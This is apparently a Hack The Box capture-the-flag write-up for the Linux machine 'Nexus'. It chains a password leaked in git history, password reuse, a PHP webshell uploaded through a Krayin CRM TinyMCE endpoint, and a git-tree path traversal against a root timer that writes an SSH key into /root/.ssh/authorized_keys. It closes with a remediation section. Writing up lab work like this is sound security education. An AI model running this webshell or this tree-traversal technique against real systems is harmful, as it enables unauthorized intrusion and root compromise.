# Hack The Box — Nexus

- **Target:** nexus.htb (10.129.x.x)
- **OS:** Linux (Ubuntu)
- **Difficulty:** Medium
- **Stack:** nginx → Gitea 1.26 + Krayin CRM (Laravel)
- **Date:** 2026-07-03
- **Result:** Rooted 🚩 (user + root owned)

| Flag | Value |
|------|-------|
| user.txt | `<redacted — fill in from your session>` |
| root.txt | `<redacted — fill in from your session>` |

---

## Task Answers (quick reference)

| # | Question | Answer |
|---|----------|--------|
| 1 | How many TCP ports are open? | **2** (22, 80) |
| 2 | Which vhosts are exposed besides `nexus.htb`? | `git.nexus.htb` (Gitea) and `billing.nexus.htb` (Krayin CRM) |
| 3 | Where is the first secret leaked? | Git history of `admin/krayin-docker-setup` — a blanked `.env` still holds `DB_PASSWORD` in the prior commit |
| 4 | Web RCE vector | Krayin TinyMCE uploader (`/admin/tinymce/upload`) stores `.php` verbatim → webshell |
| 5 | Foothold user | `jones` (SSH, via password reused from the live `/var/www/krayin/.env`) |
| 6 | Privesc vector | Root systemd timer `template-sync.py` — unsanitized git tree path → path traversal write to `/root/.ssh/authorized_keys` |

---

## The shape of it

Five links, each a small misplaced trust — in old commits, in file extensions, in a shared password, and finally in a filename:

```
vhost fuzz → git.nexus.htb (Gitea) · billing.nexus.htb (Krayin CRM)
  └─ Gitea repo admin/krayin-docker-setup → git history leaks a DB password
       └─ password reuse → Krayin CRM admin (j.matthew)
            └─ TinyMCE /admin/tinymce/upload keeps .php → webshell → www-data
                 └─ live .env DB pass → reused on SSH → jones → user.txt
                      └─ root timer template-sync.py: os.path.join(stage, tree_path)
                           └─ tree path ../../../../../root/.ssh/authorized_keys → root
```

---

## 1. Enumeration

### Port scan

```bash
nmap -sC -sV -T4 -p- --min-rate 2000 10.129.x.x
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 (Ubuntu)
80/tcp open  http    nginx 1.24.0
|_http-title: Did not follow redirect to http://nexus.htb/
```

Only **2 ports** are open. nginx issues a 302 to `http://nexus.htb/`, which means the site is virtual-hosted by name — add it to hosts and start fuzzing the `Host` header for more vhosts.

```bash
echo '10.129.x.x  nexus.htb git.nexus.htb billing.nexus.htb' | sudo tee -a /etc/hosts
```

### vhost fuzzing

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
     -u http://10.129.x.x/ -H "Host: FUZZ.nexus.htb" \
     -fs <baseline-size>
```

```
git       [Status: 200]   →  git.nexus.htb      — Gitea 1.26
billing   [Status: 200]   →  billing.nexus.htb  — Krayin CRM (Laravel)
```

Two more names surface:
- **`git.nexus.htb`** — a **Gitea 1.26** instance with a public repository `admin/krayin-docker-setup`.
- **`billing.nexus.htb`** — a **Krayin CRM** (Laravel) login portal.

---

## 2. Loot — a password blanked, but not gone

The `admin/krayin-docker-setup` repo ships a Docker `.env`. At `HEAD` the password field looks scrubbed — but **git keeps every version**. Clone it and read the whole history:

```bash
git clone http://git.nexus.htb/admin/krayin-docker-setup.git
cd krayin-docker-setup
git log -p --all | grep -iE 'DB_PASSWORD|PASSWORD='
```

```
+DB_PASSWORD=<leaked-db-password>      # first commit — live value
-DB_PASSWORD=<leaked-db-password>
+DB_PASSWORD=                          # second commit — "redacted"
```

The first commit carries a real `DB_PASSWORD`; the follow-up commit blanks it. The blank is only at `HEAD` — the value is one `git log -p` away.

> **Key takeaway:** never trust a redaction commit. `git log -p --all` (and tools like **trufflehog** / **gitleaks**) read the whole history, not just `HEAD`. A committed secret is compromised the instant it lands — rotate it, don't blank it.

---

## 3. Web RCE — an editor that keeps your `.php`

That leaked password logs `j.matthew@nexus.htb` straight into the Krayin CRM admin (password reuse between the DB and the app account):

```
billing.nexus.htb/admin/login
  user: j.matthew@nexus.htb
  pass: <leaked-db-password>
```

Krayin embeds a **TinyMCE** editor whose image endpoint at `/admin/tinymce/upload` validates nothing — it stores whatever you send under `/storage/tinymce/` and hands back the URL. Feed it a PHP file and it keeps the extension:

```bash
# from an authenticated session (cookies from the CRM login)
curl -s -b cookies.txt \
     -F 'file=@shell.php;type=image/png' \
     http://billing.nexus.htb/admin/tinymce/upload
# → {"url":"http://billing.nexus.htb/storage/tinymce/shell.php"}
```

`shell.php`:

```php
<?php system($_GET['c']); ?>
```

Requesting that URL runs commands as **www-data**:

```bash
curl -s "http://billing.nexus.htb/storage/tinymce/shell.php?c=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upgrade to a proper reverse shell from there.

---

## 4. Foothold — the real password lives on disk

The **live** application `.env` is not the git one. As `www-data`, read the deployed config:

```bash
cat /var/www/krayin/.env | grep -E 'DB_|APP_'
# DB_PASSWORD=<live-env-password>   ← different from the leaked git password
```

`/etc/passwd` shows a real login user, and that live password is reused for it:

```bash
grep -E 'sh$' /etc/passwd
# jones:x:1000:1000:...:/home/jones:/bin/bash
```

```bash
ssh jones@10.129.x.x     # password: <live-env-password>
cat ~/user.txt
```

**User flag captured.**

> Two different DB passwords in play — the one leaked from git history unlocks the *app*; the one in the *live* `.env` unlocks the *shell account*. Read both.

---

## 5. Privilege Escalation — a root cron that trusts filenames

A systemd timer runs `/etc/gitea/template-sync.py` **as root, every minute**. For each Gitea repo flagged as a *template*, it reads the git tree and writes each blob into a staging directory:

```python
# template-sync.py  (runs as root)
target = os.path.join(stage_path, filepath)   # filepath comes straight from `git ls-tree`
os.makedirs(os.path.dirname(target), exist_ok=True)
with open(target, 'wb') as f:
    f.write(blob)
```

`os.path.join(base, untrusted)` is **not containment**: if `filepath` is absolute or laden with `../`, the result walks out of `stage_path`. Git blob paths are never sanitized here, so a tree entry named `../../../../../root/.ssh/authorized_keys` escapes staging and is written **by root**.

Normal `git add` refuses `..` in a path, but the low-level plumbing does not — build the tree by hand with `git mktree`:

```bash
# 1) our SSH public key becomes the blob content
ssh-keygen -t ed25519 -f ./nexus_root -N ''
BLOB=$(git hash-object -w --stdin < nexus_root.pub)

# 2) craft a tree whose entry NAME is the traversal path
printf '100644 blob %s\t../../../../../root/.ssh/authorized_keys\n' "$BLOB" \
  | git mktree
# → <tree-sha>

# 3) commit that tree and push it to a repo we control on Gitea
COMMIT=$(git commit-tree <tree-sha> -m pwn)
git push http://git.nexus.htb/jones/evil.git "$COMMIT:refs/heads/main"
```

Flag the repo as a **template** in Gitea's settings, wait up to one minute for the timer, then log in as root with the matching private key:

```bash
ssh -i ./nexus_root root@10.129.x.x
id            # uid=0(root)
cat /root/root.txt
```

**Root flag captured.**

> **Why it works:** the timer trusts a filename supplied by an attacker-controlled git tree. `os.path.join` happily returns an absolute/escaping path; the fix is to `os.path.realpath` the join and assert `startswith(stage_path)`, and to reject any tree path containing `..`.

---

## 6. Remediation

- **Secrets in git history:** purge with `git filter-repo` (or BFG), don't just blank in a new commit — and **rotate** anything ever committed. Gate pushes with `gitleaks`/`trufflehog`.
- **Unvalidated uploads:** re-encode uploaded images server-side, store them **outside the web root** (or with a forced non-executable extension), and never trust the client-supplied filename or MIME type.
- **Password reuse:** the app DB password, the CRM admin, and the `jones` shell account must not share a secret. Use distinct, managed credentials.
- **Path-traversal on extraction (the "zip-slip"/tree-slip class):** resolve every destination with `os.path.realpath` and confirm it stays inside the target directory before writing; reject `..` and absolute components outright.

---

## Attack chain summary

```
nmap (2 ports: 22/80)  →  nginx vhost fuzz
  └─ git.nexus.htb (Gitea) + billing.nexus.htb (Krayin CRM)
       └─ git log -p: blanked .env still leaks DB_PASSWORD
            └─ password reuse → Krayin admin (j.matthew)
                 └─ TinyMCE /admin/tinymce/upload keeps .php → webshell → www-data
                      └─ live /var/www/krayin/.env pass → reused → SSH jones → user.txt
                           └─ root timer template-sync.py: os.path.join(stage, tree_path)
                                └─ git mktree ../../../../../root/.ssh/authorized_keys
                                     └─ root writes our key → SSH root → root.txt
```

*Authorized lab work only — Nexus is a Hack The Box machine on a sanctioned network. Charted by ssephi.*
